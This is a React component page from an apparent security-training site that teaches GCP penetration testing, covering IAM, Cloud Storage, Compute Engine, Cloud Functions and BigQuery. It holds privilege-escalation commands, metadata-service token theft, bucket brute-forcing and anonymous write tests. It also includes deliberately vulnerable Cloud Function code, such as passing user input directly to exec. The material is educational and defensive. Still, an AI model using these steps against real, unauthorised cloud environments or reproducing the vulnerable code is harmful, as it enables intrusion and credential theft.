
import React from 'react';
import CodeExample from '@/components/CodeExample';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";

const GCPSection: React.FC = () => {
  return (
    <section className="space-y-12">
      <div>
        <h2 className="text-3xl font-bold mb-6">Google Cloud Platform (GCP) Penetration Testing</h2>
        <p className="mb-8">
          Google Cloud Platform has its own unique architecture and security model.
          Testing GCP environments requires understanding specific services, IAM system,
          and potential vulnerabilities unique to Google Cloud.
        </p>
        
        <Tabs defaultValue="common-vulnerabilities">
          <TabsList>
            <TabsTrigger value="common-vulnerabilities">Common Vulnerabilities</TabsTrigger>
            <TabsTrigger value="testing-approach">Testing Approach</TabsTrigger>
            <TabsTrigger value="tools">Tools</TabsTrigger>
          </TabsList>
          
          <TabsContent value="common-vulnerabilities" className="space-y-6 mt-6">
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">GCP IAM Vulnerabilities</h3>
              <Accordion type="single" collapsible className="w-full mb-4">
                <AccordionItem value="item-1">
                  <AccordionTrigger className="text-lg font-medium">Role and Permission Misconfigurations</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      GCP's IAM system can have complex permission structures that are often misconfigured.
                    </p>
                    <h5 className="font-semibold mb-2">Common Issues:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Overly permissive predefined roles (Owner, Editor)</li>
                      <li>Inadequate use of custom roles with least privilege</li>
                      <li>Inappropriate role bindings at organizational/folder level</li>
                      <li>Missing separation of duties in role assignments</li>
                      <li>Unused but still active role bindings</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="IAM Role Assessment"
                      code={`# List IAM policies at organization level
gcloud organizations get-iam-policy ORGANIZATION_ID

# List IAM policies at folder level
gcloud resource-manager folders get-iam-policy FOLDER_ID

# List IAM policies at project level
gcloud projects get-iam-policy PROJECT_ID

# Check for principals with Owner role
gcloud projects get-iam-policy PROJECT_ID --format="json" | jq '.bindings[] | select(.role=="roles/owner") | .members'

# List all custom roles to check for potential over-permissiveness
gcloud iam roles list --project=PROJECT_ID

# Examine a specific custom role
gcloud iam roles describe --project=PROJECT_ID ROLE_ID`}
                    />
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-2">
                  <AccordionTrigger className="text-lg font-medium">Service Account Vulnerabilities</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Service accounts in GCP are often misconfigured and can lead to significant security issues.
                    </p>
                    <h5 className="font-semibold mb-2">Risk Areas:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Service account key mismanagement (long-lived keys)</li>
                      <li>Excessive permissions assigned to service accounts</li>
                      <li>Default service accounts with editor/owner roles</li>
                      <li>Service account impersonation exposed to too many users</li>
                      <li>Service account keys stored insecurely</li>
                      <li>Missing rotation policies for service account keys</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="Service Account Assessment"
                      code={`# List service accounts
gcloud iam service-accounts list --project=PROJECT_ID

# Get details for a specific service account
gcloud iam service-accounts describe SERVICE_ACCOUNT_EMAIL

# List keys for a service account and check their creation dates
gcloud iam service-accounts keys list --iam-account=SERVICE_ACCOUNT_EMAIL

# Check IAM policy bindings for a service account
gcloud projects get-iam-policy PROJECT_ID --format=json | jq '.bindings[] | select(.members[] | contains("serviceAccount:"))' 

# Check who can impersonate service accounts
gcloud projects get-iam-policy PROJECT_ID --format=json | jq '.bindings[] | select(.role=="roles/iam.serviceAccountUser" or .role=="roles/iam.serviceAccountTokenCreator")'

# Check if compute default service account has excessive permissions
DEFAULT_SA="$(gcloud iam service-accounts list --filter="displayName:Compute Engine default service account" --format="value(email)")"
gcloud projects get-iam-policy PROJECT_ID --format=json | jq --arg sa "$DEFAULT_SA" '.bindings[] | select(.members[] | contains($sa))'`}
                    />
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-3">
                  <AccordionTrigger className="text-lg font-medium">Privilege Escalation Paths</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Several privilege escalation paths exist in GCP through IAM permission combinations.
                    </p>
                    <h5 className="font-semibold mb-2">Escalation Techniques:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Using custom role creation capabilities to grant higher privileges</li>
                      <li>Leveraging service account impersonation</li>
                      <li>Deploying Cloud Functions with higher privileges</li>
                      <li>Using compute instance metadata to access service account credentials</li>
                      <li>Exploiting project creation permissions</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="Privilege Escalation Example"
                      code={`# 1. If you have permission to create/update custom roles:
# Create a privileged role
cat > privileged-role.yaml << EOF
title: Privileged Custom Role
description: Role with elevated privileges
stage: GA
includedPermissions:
- iam.serviceAccounts.actAs
- iam.serviceAccounts.create
- iam.serviceAccounts.delete
- iam.roles.create
- iam.roles.update
EOF

gcloud iam roles create PrivilegedRole --project=PROJECT_ID --file=privileged-role.yaml

# 2. If you can create a service account and assign roles:
gcloud iam service-accounts create privileged-sa --display-name="Privileged SA"
gcloud projects add-iam-policy-binding PROJECT_ID --member="serviceAccount:privileged-sa@PROJECT_ID.iam.gserviceaccount.com" --role="roles/owner"

# 3. If you can impersonate service accounts:
gcloud iam service-accounts add-iam-policy-binding \
  TARGET_SERVICE_ACCOUNT_EMAIL \
  --member="user:YOUR_EMAIL" \
  --role="roles/iam.serviceAccountTokenCreator"

# Then use this service account
gcloud auth activate-service-account TARGET_SERVICE_ACCOUNT_EMAIL --key-file=key.json
# or
gcloud compute instances create escalation-vm \
  --service-account=TARGET_SERVICE_ACCOUNT_EMAIL \
  --scopes=cloud-platform`}
                    />
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
              
              <p className="mb-4">
                Identity and Access Management in GCP can have several security issues:
              </p>
              <ul className="list-disc pl-6 space-y-2">
                <li>Overly permissive IAM roles and bindings</li>
                <li>Service account key mismanagement</li>
                <li>Default service accounts with excessive permissions</li>
                <li>Improper use of primitive roles (Owner, Editor, Viewer)</li>
                <li>Missing separation of duties for privileged accounts</li>
                <li>Inadequate conditional role bindings</li>
                <li>Organization-level policy misconfigurations</li>
              </ul>
              
              <h4 className="text-xl font-bold mt-4 mb-2">Testing GCP IAM Security</h4>
              <CodeExample 
                language="bash"
                title="GCP IAM Assessment"
                code={`# List IAM policies at project level
gcloud projects get-iam-policy PROJECT_ID

# List service accounts
gcloud iam service-accounts list --project=PROJECT_ID

# Check keys for a service account
gcloud iam service-accounts keys list --iam-account=SERVICE_ACCOUNT_EMAIL

# Examine IAM policy bindings
gcloud projects get-iam-policy PROJECT_ID --format=json | jq '.bindings[]'

# Check for users with Owner role
gcloud projects get-iam-policy PROJECT_ID --format=json | jq '.bindings[] | select(.role=="roles/owner")'

# Check organization policies
gcloud resource-manager org-policies list --organization=ORGANIZATION_ID`}
              />
            </div>
            
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">Cloud Storage Misconfigurations</h3>
              <Accordion type="single" collapsible className="w-full mb-4">
                <AccordionItem value="item-1">
                  <AccordionTrigger className="text-lg font-medium">Public Access and ACL Issues</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      GCP Cloud Storage buckets can be exposed to the internet through various misconfigurations.
                    </p>
                    <h5 className="font-semibold mb-2">Common Misconfigurations:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>allUsers or allAuthenticatedUsers granted access in bucket or object ACLs</li>
                      <li>Public access prevention not enabled at bucket or organization level</li>
                      <li>Improper use of signed URLs with long expiration times</li>
                      <li>Readable buckets with sensitive data</li>
                      <li>Writable buckets allowing data tampering or malware uploads</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="Public Storage Assessment"
                      code={`# Check bucket ACLs
gsutil acl get gs://BUCKET_NAME

# Check IAM policies on bucket
gsutil iam get gs://BUCKET_NAME

# Look for public access in ACLs
gsutil acl get gs://BUCKET_NAME | grep -E "allUsers|allAuthenticatedUsers"

# Look for public access in IAM
gsutil iam get gs://BUCKET_NAME | grep -E "allUsers|allAuthenticatedUsers"

# Test anonymous access to bucket
curl -I https://storage.googleapis.com/BUCKET_NAME/

# Try to list objects anonymously
curl https://storage.googleapis.com/BUCKET_NAME?list

# Check if public access prevention is enabled
gsutil pap get gs://BUCKET_NAME`}
                    />
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-2">
                  <AccordionTrigger className="text-lg font-medium">Encryption and Data Protection Issues</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Data in Cloud Storage might not be properly protected with encryption or access controls.
                    </p>
                    <h5 className="font-semibold mb-2">Security Concerns:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Missing default encryption settings</li>
                      <li>Using Google-managed keys instead of customer-managed keys for sensitive data</li>
                      <li>Improper key rotation policies for customer-managed encryption keys</li>
                      <li>Missing object versioning for critical data</li>
                      <li>Inadequate retention policies allowing premature deletion</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="Storage Encryption Assessment"
                      code={`# Check default encryption on a bucket
gsutil encryption gs://BUCKET_NAME

# Check if CMEK is used
gsutil kms gs://BUCKET_NAME

# Check object versioning status
gsutil versioning get gs://BUCKET_NAME

# Check retention policy
gsutil retention get gs://BUCKET_NAME

# Check object hold configuration
gsutil retention event-default get gs://BUCKET_NAME

# List all objects in a bucket with encryption info
gsutil ls -L gs://BUCKET_NAME`}
                    />
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-3">
                  <AccordionTrigger className="text-lg font-medium">Logging and Monitoring Deficiencies</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Inadequate logging and monitoring can hide unauthorized access to Cloud Storage data.
                    </p>
                    <h5 className="font-semibold mb-2">Common Gaps:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Data access logs not enabled for buckets with sensitive information</li>
                      <li>Missing alerting for unusual access patterns</li>
                      <li>Insufficient log retention periods</li>
                      <li>No real-time monitoring for bucket permission changes</li>
                      <li>Lack of integration with SIEM or security monitoring tools</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="Storage Logging Assessment"
                      code={`# Check if data access logging is enabled
gsutil logging get gs://BUCKET_NAME

# Configure logging (if not enabled)
gsutil logging set on -b gs://LOG_BUCKET_NAME gs://TARGET_BUCKET_NAME

# Check Cloud Audit Logs configuration in the project
gcloud projects get-iam-policy PROJECT_ID | grep auditLogConfigs

# List available logs
gcloud logging logs list --project=PROJECT_ID | grep storage

# Example query to check for recent public access grants
gcloud logging read "resource.type=gcs_bucket AND protoPayload.methodName=storage.setIamPermissions AND protoPayload.serviceData.policyDelta.bindingDeltas.member:allUsers" --project=PROJECT_ID --limit=10`}
                    />
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
              
              <p className="mb-4">
                GCP Cloud Storage buckets can have security issues:
              </p>
              <ul className="list-disc pl-6 space-y-2">
                <li>Public bucket access without authentication</li>
                <li>Excessive IAM permissions on buckets</li>
                <li>Lack of object versioning for critical data</li>
                <li>Missing encryption for sensitive data</li>
                <li>Improper management of signed URLs</li>
                <li>Insufficient logging and monitoring</li>
              </ul>
              
              <h4 className="text-xl font-bold mt-4 mb-2">Testing Cloud Storage Security</h4>
              <CodeExample 
                language="bash"
                title="Cloud Storage Assessment"
                code={`# List buckets
gsutil ls

# Get bucket ACLs
gsutil acl get gs://BUCKET_NAME

# Get bucket IAM policy
gsutil iam get gs://BUCKET_NAME

# Check if bucket is publicly accessible
gsutil iam get gs://BUCKET_NAME | grep allUsers

# List objects in a bucket
gsutil ls -r gs://BUCKET_NAME/

# Test if you can read a specific object anonymously
curl -I https://storage.googleapis.com/BUCKET_NAME/OBJECT_NAME

# Using GCPBucketBrute for finding open buckets
python gcpbucketbrute.py -k KEYWORD -o output.txt

# Check bucket encryption settings
gsutil encryption get gs://BUCKET_NAME`}
              />
            </div>
            
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">Compute Engine Vulnerabilities</h3>
              <Accordion type="single" collapsible className="w-full mb-4">
                <AccordionItem value="item-1">
                  <AccordionTrigger className="text-lg font-medium">Network Configuration Issues</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Compute Engine VMs can be exposed to attacks through network misconfigurations.
                    </p>
                    <h5 className="font-semibold mb-2">Security Issues:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Overly permissive firewall rules (0.0.0.0/0)</li>
                      <li>Publicly exposed management ports (SSH, RDP)</li>
                      <li>Missing VPC Service Controls</li>
                      <li>Inadequate network segmentation</li>
                      <li>Public IP addresses on sensitive VMs</li>
                      <li>Improperly configured VPC peering</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="Network Security Assessment"
                      code={`# List firewall rules
gcloud compute firewall-rules list --format="table(name,network,direction,sourceRanges,allowed.ports,targetTags,disabled)"

# Find permissive ingress rules
gcloud compute firewall-rules list --filter="direction=INGRESS AND sourceRanges:0.0.0.0/0" --format="table(name,network,direction,sourceRanges,allowed.ports,targetTags)"

# List instances with public IPs
gcloud compute instances list --format="table(name,zone,networkInterfaces[0].accessConfigs[0].natIP,networkInterfaces[0].network.basename(),status)"

# Check VPC network peering
gcloud compute networks peerings list

# Check routes that might allow unintended traffic paths
gcloud compute routes list

# Examine VPC Service Controls (if configured)
gcloud access-context-manager perimeters list --organization=ORGANIZATION_ID`}
                    />
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-2">
                  <AccordionTrigger className="text-lg font-medium">Service Account and Metadata Service Issues</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      VM service accounts and metadata service can be exploited if not properly secured.
                    </p>
                    <h5 className="font-semibold mb-2">Vulnerability Areas:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Overly privileged service accounts attached to VMs</li>
                      <li>Metadata service v1 accessible without HTTP headers</li>
                      <li>SSRF vulnerabilities exposing metadata service</li>
                      <li>Missing OS Login configuration</li>
                      <li>SSH keys stored in project metadata</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="Metadata Service Assessment"
                      code={`# From within the VM, test metadata service access
curl "http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google"

# Check for service account attached to VM
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" -H "Metadata-Flavor: Google"

# Get service account token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# Check if metadata service is accessible without the header (vulnerable)
curl "http://metadata.google.internal/computeMetadata/v1/instance/"

# Check project-wide SSH keys
gcloud compute project-info describe --format="yaml(commonInstanceMetadata)"

# Check instance-specific SSH keys
gcloud compute instances describe INSTANCE_NAME --zone=ZONE --format="yaml(metadata)"`}
                    />
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-3">
                  <AccordionTrigger className="text-lg font-medium">OS and Application Security Issues</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Compute instances often have OS-level and application security issues.
                    </p>
                    <h5 className="font-semibold mb-2">Common Vulnerabilities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Missing OS patches and updates</li>
                      <li>Insecure startup scripts in instance metadata</li>
                      <li>Weak credentials stored in user data</li>
                      <li>Vulnerable applications deployed on instances</li>
                      <li>Missing disk encryption</li>
                      <li>Inadequate logging and monitoring</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="Instance Security Assessment"
                      code={`# From GCP console or with appropriate permissions:
# Check startup script
gcloud compute instances describe INSTANCE_NAME --zone=ZONE --format="yaml(metadata.items)"

# Check OS details and update status (from within VM)
cat /etc/os-release
apt list --upgradable  # For Debian/Ubuntu
yum check-update       # For CentOS/RHEL

# Check disk encryption status
gcloud compute disks describe DISK_NAME --zone=ZONE --format="yaml(diskEncryptionKey)"

# Check VM shielding status
gcloud compute instances describe INSTANCE_NAME --zone=ZONE --format="yaml(shieldedInstanceConfig)"

# Check installed applications (from within VM)
dpkg -l  # For Debian/Ubuntu
rpm -qa  # For CentOS/RHEL

# Check for suspicious processes
ps aux | grep -i [s]shd  # Example checking for SSH daemon`}
                    />
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
              
              <p className="mb-4">
                GCP Compute Engine instances may have security issues:
              </p>
              <ul className="list-disc pl-6 space-y-2">
                <li>Overly permissive firewall rules</li>
                <li>Public IP addresses on sensitive VMs</li>
                <li>Unpatched OS vulnerabilities</li>
                <li>Excessive service account permissions assigned to VMs</li>
                <li>Metadata service vulnerabilities</li>
                <li>Insecure cloud-init configurations in instance metadata</li>
              </ul>
              
              <h4 className="text-xl font-bold mt-4 mb-2">Testing Compute Engine Security</h4>
              <CodeExample 
                language="bash"
                title="Compute Engine Assessment"
                code={`# List Compute instances
gcloud compute instances list

# Get instance details
gcloud compute instances describe INSTANCE_NAME --zone=ZONE

# Check firewall rules
gcloud compute firewall-rules list

# Check for instances with public IPs
gcloud compute instances list --format="table(name,networkInterfaces[0].accessConfigs[0].natIP)"

# Testing metadata service from a VM
curl "http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google"

# Get service account scopes for an instance
gcloud compute instances describe INSTANCE_NAME --zone=ZONE --format="yaml(serviceAccounts)"

# Get the service account token from metadata service
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# Check startup scripts in metadata
gcloud compute instances describe INSTANCE_NAME --zone=ZONE --format="yaml(metadata)"`}
              />
            </div>
            
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">Cloud Functions Vulnerabilities</h3>
              <Accordion type="single" collapsible className="w-full mb-4">
                <AccordionItem value="item-1">
                  <AccordionTrigger className="text-lg font-medium">Access Control Misconfigurations</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Cloud Functions can have insufficient access controls, leading to unauthorized invocation.
                    </p>
                    <h5 className="font-semibold mb-2">Security Issues:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Public (allUsers) invocation permissions on HTTP-triggered functions</li>
                      <li>Missing authentication requirements for HTTP functions</li>
                      <li>Insufficient IAM roles for function invocation</li>
                      <li>Lack of proper authorization within function code</li>
                      <li>Missing IP-based access restrictions</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="Function Access Control Assessment"
                      code={`# List Cloud Functions
gcloud functions list

# Check IAM policy for a function
gcloud functions get-iam-policy FUNCTION_NAME

# Check for public access
gcloud functions get-iam-policy FUNCTION_NAME --format=json | jq '.bindings[] | select(.members[] | contains("allUsers"))'

# Test HTTP function invocation (if publicly accessible)
curl https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME

# Check function details including trigger type
gcloud functions describe FUNCTION_NAME

# Update policy to remove public access (remediation)
gcloud functions remove-iam-policy-binding FUNCTION_NAME --member="allUsers" --role="roles/cloudfunctions.invoker"`}
                    />
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-2">
                  <AccordionTrigger className="text-lg font-medium">Code and Dependency Vulnerabilities</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Cloud Functions may contain vulnerable code or dependencies.
                    </p>
                    <h5 className="font-semibold mb-2">Common Issues:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Outdated libraries with known vulnerabilities</li>
                      <li>Insecure coding practices (input validation, injection flaws)</li>
                      <li>Hardcoded secrets in function code or environment variables</li>
                      <li>Command injection vulnerabilities</li>
                      <li>Excessive error information in responses</li>
                    </ul>
                    <CodeExample 
                      language="javascript"
                      title="Vulnerable Function Code Examples"
                      code={`// Example 1: Command injection vulnerability
exports.vulnerable = (req, res) => {
  const userInput = req.query.cmd;
  const { exec } = require('child_process');
  
  // VULNERABLE: Direct use of user input in command execution
  exec(userInput, (error, stdout, stderr) => {
    res.status(200).send(stdout);
  });
};

// Example 2: NoSQL injection vulnerability
exports.queryData = (req, res) => {
  const userInput = req.query.user;
  const { Datastore } = require('@google-cloud/datastore');
  const datastore = new Datastore();
  
  // VULNERABLE: Direct use of user input in query
  const query = datastore.createQuery('Users')
    .filter('username', '=', userInput);
  
  datastore.runQuery(query).then(results => {
    res.status(200).send(results[0]);
  });
};

// Example 3: Hardcoded secrets
exports.processPayment = (req, res) => {
  // VULNERABLE: Hardcoded API key
  const apiKey = "sk_live_abcdefghijklmnopqrstuvwxyz";
  
  // Process payment logic...
  res.status(200).send('Payment processed');
};`}
                    />
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-3">
                  <AccordionTrigger className="text-lg font-medium">Service Account and Permission Issues</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Cloud Functions often run with overprivileged service accounts.
                    </p>
                    <h5 className="font-semibold mb-2">Risk Areas:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Excessive IAM permissions for function service accounts</li>
                      <li>Using default service account with Editor role</li>
                      <li>Insufficient security boundaries between functions</li>
                      <li>Missing principle of least privilege implementation</li>
                      <li>Inadequate monitoring of function activities</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="Function Service Account Assessment"
                      code={`# Get function details including service account
gcloud functions describe FUNCTION_NAME --format=json | jq '.serviceAccountEmail'

# Check IAM policy bindings for the service account
SERVICE_ACCOUNT=$(gcloud functions describe FUNCTION_NAME --format=json | jq -r '.serviceAccountEmail')
gcloud projects get-iam-policy PROJECT_ID --format=json | jq --arg sa "$SERVICE_ACCOUNT" '.bindings[] | select(.members[] | contains($sa))'

# Check if function uses the default compute service account (bad practice)
gcloud functions describe FUNCTION_NAME --format=json | jq -r '.serviceAccountEmail' | grep -q "compute@developer.gserviceaccount.com" && echo "Using default compute service account"

# Create proper service account with least privilege (remediation)
gcloud iam service-accounts create function-specific-sa --display-name="Function Specific Service Account"
gcloud projects add-iam-policy-binding PROJECT_ID --member="serviceAccount:function-specific-sa@PROJECT_ID.iam.gserviceaccount.com" --role="roles/cloudfunctions.invoker"

# Update function to use specific service account (remediation)
gcloud functions deploy FUNCTION_NAME --service-account=function-specific-sa@PROJECT_ID.iam.gserviceaccount.com`}
                    />
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
              
              <p className="mb-4">
                GCP Cloud Functions may contain security issues:
              </p>
              <ul className="list-disc pl-6 space-y-2">
                <li>Improper authentication configuration</li>
                <li>Vulnerable dependencies in function code</li>
                <li>Excessive IAM permissions for function service accounts</li>
                <li>Insecure handling of secrets</li>
                <li>Lack of input validation leading to injection attacks</li>
                <li>Public HTTP triggers without adequate access controls</li>
              </ul>
              
              <h4 className="text-xl font-bold mt-4 mb-2">Testing Cloud Functions</h4>
              <CodeExample 
                language="bash"
                title="Cloud Functions Assessment"
                code={`# List Cloud Functions
gcloud functions list

# Get function details
gcloud functions describe FUNCTION_NAME

# Check function permissions
gcloud functions get-iam-policy FUNCTION_NAME

# Test HTTP trigger function (if publicly accessible)
curl https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME

# Download function source code (if you have permissions)
gcloud functions deploy --source-url-prefix=gs://PROJECT_ID_cloudfunctions/FUNCTION_NAME

# Check environment variables (may contain secrets)
gcloud functions describe FUNCTION_NAME --format=json | jq '.environmentVariables'

# Check runtime and memory settings
gcloud functions describe FUNCTION_NAME --format=json | jq '{runtime: .runtime, memory: .availableMemoryMb}'`}
              />
            </div>
            
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">BigQuery Security Issues</h3>
              <p className="mb-4">
                BigQuery datasets and tables can have security misconfigurations:
              </p>
              <ul className="list-disc pl-6 space-y-2">
                <li>Public access to sensitive datasets</li>
                <li>Overly permissive dataset and table permissions</li>
                <li>Unencrypted sensitive data</li>
                <li>Missing column-level security for PII</li>
                <li>Inadequate audit logging and monitoring</li>
                <li>Insecure data exports to Cloud Storage</li>
              </ul>
              
              <h4 className="text-xl font-bold mt-4 mb-2">Testing BigQuery Security</h4>
              <CodeExample 
                language="bash"
                title="BigQuery Security Assessment"
                code={`# List datasets
bq ls --project_id=PROJECT_ID

# Check dataset access controls
bq show --format=prettyjson PROJECT_ID:DATASET_NAME

# Check for public datasets
bq show --format=json PROJECT_ID:DATASET_NAME | jq '.access[] | select(.specialGroup=="allUsers" or .specialGroup=="allAuthenticatedUsers")'

# List tables in a dataset
bq ls --format=prettyjson PROJECT_ID:DATASET_NAME

# Check table info including schema
bq show --format=prettyjson PROJECT_ID:DATASET_NAME.TABLE_NAME

# Check if column-level security is used
bq show --format=json PROJECT_ID:DATASET_NAME.TABLE_NAME | jq '.tableReference, .policyTags'`}
              />
            </div>
          </TabsContent>
          
          <TabsContent value="testing-approach" className="space-y-6 mt-6">
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">Step-by-Step GCP Penetration Testing</h3>
              
              <Accordion type="single" collapsible className="w-full">
                <AccordionItem value="item-1">
                  <AccordionTrigger className="text-lg font-medium">1. Reconnaissance</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      The first phase involves identifying GCP resources belonging to the target organization without direct access to their GCP environment.
                    </p>
                    <h5 className="font-semibold mb-2">Key Activities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Identify GCP resources using DNS, Shodan, and other OSINT techniques</li>
                      <li>Discover Cloud Storage buckets, Cloud Functions, and App Engine apps</li>
                      <li>Map out GCP project IDs and organization structure</li>
                      <li>Identify subdomains pointing to GCP services</li>
                      <li>Search for exposed GCP credentials in public repositories</li>
                    </ul>
                    
                    <h5 className="font-semibold mb-2">Tools and Techniques:</h5>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-3">
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">DNS and Subdomain Discovery</h6>
                        <CodeExample 
                          language="bash"
                          title="GCP Resource Discovery"
                          code={`# Using subdomain enumeration tools
subfinder -d example.com | grep -E "appspot.com|storage.googleapis.com|cloudfunctions.net"

# Using dnsrecon
dnsrecon -d example.com -t std,brt

# Looking for GCP-specific CNAME records
dig CNAME *.example.com | grep -E "c.storage.googleapis.com|appspot.com"

# Using Shodan to find GCP resources
shodan search org:"Example Company" "X-GUploader-UploadID"
shodan search hostname:appspot.com "example"`}
                        />
                      </div>
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Storage Bucket Discovery</h6>
                        <CodeExample 
                          language="bash"
                          title="GCP Bucket Discovery"
                          code={`# Using GCPBucketBrute
python3 gcpbucketbrute.py -k company-name -p permutations.txt

# Testing for common bucket naming patterns
for prefix in "dev" "test" "prod" "stage" "data" "backup" "static"; do
  curl -s -o /dev/null -w "%{http_code}" https://storage.googleapis.com/company-name-$prefix
  echo " - company-name-$prefix"
done

# Testing for directory listing
curl -s https://storage.googleapis.com/company-name-prod?list=true

# Using public GCS bucket search engines (like GrayhatWarfare)
# https://buckets.grayhatwarfare.com/`}
                        />
                      </div>
                    </div>
                    
                    <h5 className="font-semibold mb-2">Example Workflow:</h5>
                    <ol className="list-decimal pl-6 mb-3 space-y-1">
                      <li>Start by gathering the target's domain names</li>
                      <li>Perform subdomain enumeration to discover potential GCP assets
                        <ul className="list-disc pl-6 mt-1">
                          <li>Look for subdomains with GCP signatures (*.appspot.com, *.storage.googleapis.com)</li>
                          <li>Identify custom domains pointing to GCP services via CNAME records</li>
                        </ul>
                      </li>
                      <li>Use bucket discovery techniques based on common naming patterns
                        <ul className="list-disc pl-6 mt-1">
                          <li>company-name-prod, company-name-dev, etc.</li>
                          <li>Prefix and suffix permutations (prod-company, company-backup, etc.)</li>
                        </ul>
                      </li>
                      <li>Search code repositories for GCP configurations or credentials
                        <ul className="list-disc pl-6 mt-1">
                          <li>Look for service account key files (.json)</li>
                          <li>Search for GCP API keys or project IDs</li>
                          <li>Find App Engine YAML configs or Terraform files</li>
                        </ul>
                      </li>
                      <li>Use search engines to find potential exposed GCP resources</li>
                    </ol>
                    
                    <h5 className="font-semibold mb-2">Expected Outcomes:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>List of Cloud Storage buckets associated with the target</li>
                      <li>Identified App Engine applications and Cloud Functions</li>
                      <li>Project IDs and organizational structure insights</li>
                      <li>Potential entry points for further testing</li>
                      <li>Understanding of the target's GCP architecture</li>
                    </ul>
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-2">
                  <AccordionTrigger className="text-lg font-medium">2. Initial Access Vector Identification</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      This phase focuses on identifying potential ways to gain initial access to the GCP environment.
                    </p>
                    <h5 className="font-semibold mb-2">Key Activities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Test for public Cloud Storage buckets</li>
                      <li>Check for exposed service account keys</li>
                      <li>Look for public Cloud Functions and HTTP endpoints</li>
                      <li>Test for SSRF vulnerabilities that could access metadata service</li>
                      <li>Check for open GCP APIs and services</li>
                      <li>Search for leaked credentials in public code repositories</li>
                    </ul>
                    
                    <h5 className="font-semibold mb-2">Storage Bucket Testing:</h5>
                    <CodeExample 
                      language="bash"
                      title="Storage Bucket Access Testing"
                      code={`# Test reading from bucket
curl -s https://storage.googleapis.com/target-bucket/

# Test listing bucket objects
curl -s https://storage.googleapis.com/target-bucket/?list

# Test writing to bucket (create test.txt with content "test")
curl -X POST -d "test" -H "Content-Type: text/plain" https://storage.googleapis.com/target-bucket/test.txt

# Using gsutil (if you have credentials)
gsutil ls gs://target-bucket/
gsutil cp test.txt gs://target-bucket/

# Check bucket IAM permissions
gsutil iam get gs://target-bucket/`}
                    />
                    
